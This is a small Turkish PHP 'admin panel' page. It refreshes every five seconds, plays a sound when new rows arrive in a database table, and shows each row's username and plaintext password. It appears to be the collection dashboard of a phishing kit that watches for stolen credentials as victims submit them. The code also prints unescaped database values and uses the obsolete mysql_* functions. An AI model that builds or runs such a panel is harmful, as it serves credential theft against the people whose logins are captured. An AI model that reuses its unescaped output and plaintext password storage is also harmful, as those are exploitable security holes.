<!DOCTYPE html>
<html lang="tr">
<head>
	<meta charset="UTF-8">
	<title>Yönetim Paneli</title>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="5">
<body>
<?php

include("baglan.php");
		$sorgula = mysql_query("select * from ak WHERE notif='1'") or die("Hata Olustu!");
		while($veri=mysql_fetch_assoc($sorgula))
		{
		if($veri['notif'] == '1'){
			echo '<div id="alerts">
			<audio id="audioplayer" autoplay=true>
			<source src="sound/glass.mp3" type="audio/mpeg">
			Tarayiciniz ses elementlerini desteklemiyor. </audio>
			<li>
			<img src="icons/no.png" align="top" style="float:left; margin-right:2px;" />
			<div><strong>Yeni Mesaj Var</strong><br /> <i>'.$veri['kullanici'].'</i><br />  </div> '.$veri['pass'].'
			</li>
			</div>';
			mysql_query("UPDATE ak SET notif='0' WHERE id=".$veri['id']." ");
		}else {

		}
	}
?>
</body>
</html>